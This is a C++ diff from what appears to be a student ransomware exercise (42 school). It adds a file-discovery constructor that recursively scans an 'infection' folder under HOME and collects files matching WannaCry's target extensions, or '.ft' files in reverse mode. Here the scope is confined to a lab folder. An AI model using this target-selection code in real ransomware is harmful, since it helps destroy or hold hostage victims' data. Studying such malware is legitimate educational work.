@@ -6,20 +6,57 @@
 /*   By: luluzuri <luluzuri@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/07/04 11:12:53 by luluzuri          #+#    #+#             */
-/*   Updated: 2026/07/04 11:30:17 by luluzuri         ###   ########.fr       */
+/*   Updated: 2026/07/06 11:39:54 by luluzuri         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "Discovering.hpp"
+#include "extensions.hpp"
+#include "Utils.hpp"
+
+#include <cstddef>
 #include <cstdlib>
 #include <cstring>
+#include <filesystem>
+#include <vector>
 
-void Discovering::discover() {
+namespace fs = std::filesystem;
+
+Discovering::Discovering(int option_field) {
 	this->getenv_result = std::getenv(this->home.c_str());
 	if (this->getenv_result == nullptr) {
-		std::cout << "Error: getenv failed ( env not existing )" << std::endl;
+		std::cout << "Error: getenv failed ( " << this->home << " not found )"
+				  << std::endl;
 		exit(1);
 	}
 	this->complete_path = this->getenv_result + this->infection_folder_name;
-	std::cout << "this->home: " << this->home << std::endl << "this->result: " << this->getenv_result << std::endl << "concatenate path: " << this->complete_path << std::endl;
+
+	try {
+		const auto ext_set = wannacry_extensions();
+		for (const fs::directory_entry &entry :
+			 fs::recursive_directory_iterator(this->complete_path)) {
+
+			if (!entry.is_regular_file()) continue;
+
+			if ((option_field & OPT_REVERSE) != 0) {
+				if (entry.path().extension().string() == ".ft")
+					this->final_paths_vector.push_back(entry);
+			} else {
+				if (ext_set.find(entry.path().extension().string()) !=
+					ext_set.end())
+					this->final_paths_vector.push_back(entry);
+			}
+		}
+		for (const fs::directory_entry &entry : this->final_paths_vector) {
+			if ((option_field & OPT_SILENT) == 0)
+				std::cout << entry << std::endl;
+		}
+	} catch (const std::filesystem::filesystem_error &e) {
+		std::cerr << "FileSystemError: directory not found" << std::endl;
+		exit(1);
+	}
+}
+
+std::vector<std::filesystem::directory_entry> Discovering::getFinalPaths(void) {
+	return (this->final_paths_vector);
 }
